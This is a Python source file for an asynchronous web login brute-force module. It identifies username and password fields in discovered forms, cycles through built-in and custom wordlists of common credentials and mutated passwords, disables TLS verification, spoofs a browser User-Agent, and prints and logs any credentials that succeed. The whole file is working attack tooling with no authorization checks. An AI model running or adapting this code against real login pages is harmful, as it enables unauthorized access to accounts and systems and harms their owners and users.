import asyncio
import aiohttp
import logging
import os
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin


class BruteforceModule:
    def __init__(self) -> None:
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            connector=aiohttp.TCPConnector(ssl=False)
        )
        self.logger = logging.getLogger(__name__)

    async def bruteforce_login_forms(
        self,
        login_forms: List[Dict[str, Any]],
        custom_username_file: Optional[str] = None,
        custom_password_file: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Bruteforce discovered login forms with custom wordlists support"""
        successful_logins = []

        # Load base wordlists
        usernames = self._load_wordlist(custom_username_file, [
            'admin', 'administrator', 'root', 'user', 'test', 'guest',
            'manager', 'support', 'demo', 'webmaster', 'operator', 'service',
            'sa', 'postgres', 'oracle', 'mysql', 'ftp', 'mail'
        ])

        passwords = self._load_wordlist(custom_password_file, [
            'admin', 'password', '123456', '123456789', 'qwerty', 'abc123',
            'password123', 'admin123', 'root', 'letmein', 'welcome', 'monkey',
            'dragon', 'passw0rd', 'p@ssw0rd', '12345', '12345678', '1234567890',
            'Password1', 'Pass123', 'admin@123', 'root@123', 'pass', '1q2w3e4r',
            'qwerty123', 'superman', 'batman', 'starwars', 'iloveyou'
        ])

        for form in login_forms:
            form_url = form['url']
            method = form['method']
            inputs = form['inputs']

            print(f"  [*] Bruteforcing login form: {form_url}")
            self.logger.info(f"Bruteforcing login form: {form_url}")

            # Identify username and password fields
            username_field = None
            password_field = None
            other_fields = {}

            for inp in inputs:
                name = inp['name']
                if not name:
                    continue
                if 'user' in name.lower() or 'email' in name.lower() or 'login' in name.lower():
                    username_field = name
                elif 'pass' in name.lower() or 'pwd' in name.lower():
                    password_field = name
                else:
                    other_fields[name] = 'default'  # or some default value

            if not username_field or not password_field:
                print(f"    [-] Could not identify username/password fields for {form_url}")
                continue

            # Try combinations
            attempt_count = 0
            for username in usernames:
                for password in passwords:
                    attempt_count += 1
                    data = {username_field: username, password_field: password}
                    data.update(other_fields)

                    try:
                        if method == 'POST':
                            async with self.session.post(form_url, data=data, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
                                content = await response.text()
                        else:
                            # For GET, though rare
                            params = data
                            async with self.session.get(form_url, params=params, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
                                content = await response.text()

                        # Check for success indicators
                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'home', 'success', 'authenticated', 'user account']
                        failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'login', 'unauthorized', 'forbidden', 'denied']

                        content_lower = content.lower()
                        has_success = any(ind in content_lower for ind in success_indicators)
                        has_failure = any(ind in content_lower for ind in failure_indicators)
                        
                        # Enhanced heuristic: response status 200, decent size, no failure indicators
                        if (has_success or (len(content) > 500 and not has_failure)) and response.status == 200:
                            successful_logins.append({
                                'url': form_url,
                                'username': username,
                                'password': password,
                                'method': method
                            })
                            print(f"    [+] SUCCESS: {username}:{password} on {form_url}")
                            self.logger.warning(f"Successful login found: {username}:{password} on {form_url}")
                            break  # Found one, move to next form
                    except Exception as e:
                        self.logger.debug(f"Error bruteforcing {form_url}: {e}")
                        continue
                    
                    # Progress logging every 50 attempts
                    if attempt_count % 50 == 0:
                        self.logger.info(f"Bruteforce progress: {attempt_count} attempts on {form_url}")
                
                if successful_logins and successful_logins[-1]['url'] == form_url:
                    print(f"    [+] Form {form_url} compromised, moving to next form")
                    break  # Already found for this form

        return successful_logins

    def _load_wordlist(self, file_path: Optional[str], default_list: List[str]) -> List[str]:
        """Load wordlist from file or return default"""
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    words = [line.strip() for line in f if line.strip()]
                    return words[:1000]  # Limit to prevent excessive attempts
            except Exception as e:
                self.logger.warning(f"Failed to load wordlist {file_path}: {e}")
        return default_list

    async def intelligent_bruteforce(self, login_forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """ML-based password prediction and intelligent bruteforce"""
        successful_logins = []

        # Intelligent password generation based on common patterns
        intelligent_passwords = self._generate_intelligent_passwords()

        for form in login_forms:
            form_url = form['url']
            method = form['method']
            inputs = form['inputs']

            print(f"  [*] Intelligent bruteforce on: {form_url}")

            # Identify fields
            username_field, password_field, other_fields = self._identify_fields(inputs)

            if not username_field or not password_field:
                continue

            # Try intelligent combinations first
            for username in ['admin', 'root', 'administrator']:
                for password in intelligent_passwords[:50]:  # Limit attempts
                    if await self._try_login(form_url, method, username_field, password_field, username, password, other_fields):
                        successful_logins.append({
                            'url': form_url,
                            'username': username,
                            'password': password,
                            'method': 'intelligent'
                        })
                        break
                if successful_logins and successful_logins[-1]['url'] == form_url:
                    break

        return successful_logins

    def _generate_intelligent_passwords(self) -> List[str]:
        """Generate passwords based on common patterns and mutations"""
        bases = ['admin', 'password', '123456', 'qwerty', 'letmein']
        mutations = [
            lambda x: x,
            lambda x: x + '123',
            lambda x: x + '!',
            lambda x: x + '2024',
            lambda x: x.capitalize(),
            lambda x: x.upper(),
            lambda x: 'P@ssw0rd' if x == 'password' else x,
        ]

        passwords = set()
        for base in bases:
            for mutation in mutations:
                passwords.add(mutation(base))

        # Add common passwords
        common = ['admin123', 'Admin123', 'Password1', 'Welcome1', 'Monkey123']
        passwords.update(common)

        return list(passwords)

    def _identify_fields(self, inputs: List[Dict[str, str]]) -> tuple:
        """Identify username, password and other fields"""
        username_field: Optional[str] = None
        password_field: Optional[str] = None
        other_fields: Dict[str, str] = {}

        for inp in inputs:
            name = inp['name']
            if not name:
                continue
            if 'user' in name.lower() or 'email' in name.lower() or 'login' in name.lower():
                username_field = name
            elif 'pass' in name.lower() or 'pwd' in name.lower():
                password_field = name
            else:
                other_fields[name] = 'default'

        return username_field, password_field, other_fields

    async def _try_login(self, url: str, method: str, username_field: str, password_field: str, username: str, password: str, other_fields: Dict[str, str]) -> bool:
        """Try a single login attempt"""
        data = {username_field: username, password_field: password}
        data.update(other_fields)

        try:
            if method == 'POST':
                async with self.session.post(url, data=data, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
                    content = await response.text()
            else:
                params = data
                async with self.session.get(url, params=params, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
                    content = await response.text()

            # Check for success
            success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'home', 'success', 'authenticated']
            failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'login', 'unauthorized', 'forbidden', 'denied']

            content_lower = content.lower()
            has_success = any(ind in content_lower for ind in success_indicators)
            has_failure = any(ind in content_lower for ind in failure_indicators)

            return (has_success or (len(content) > 500 and not has_failure)) and response.status == 200

        except Exception as e:
            self.logger.debug('Error in _try_login for %s: %s', url, e)
            return False

    async def close(self) -> None:
        await self.session.close()